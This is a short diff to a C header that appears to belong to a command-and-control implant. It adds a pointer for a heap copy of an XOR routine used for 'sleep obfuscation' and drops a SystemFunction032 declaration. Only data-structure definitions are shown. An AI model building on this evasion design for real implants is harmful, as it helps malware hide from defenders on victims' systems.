@@ -72,6 +72,7 @@ typedef struct
         DWORD ModuleSize;
         PVOID TxtBase;
         DWORD TxtSize;
+        PVOID CryptFuncAddr; /* Heap copy of ObfXorCrypt for sleep obfuscation */
         DWORD AgentID;
         BOOL  Connected;
         DWORD PID;
@@ -309,7 +310,6 @@ typedef struct
         WIN_FUNC( GetUserNameA )
         WIN_FUNC( CreateProcessWithTokenW )
         WIN_FUNC( CreateProcessWithLogonW )
-        NTSTATUS ( WINAPI* SystemFunction032 ) ( struct ustring* data, struct ustring* key );
         WIN_FUNC( FreeSid )
         WIN_FUNC( SetSecurityDescriptorSacl )
         WIN_FUNC( SetSecurityDescriptorDacl )
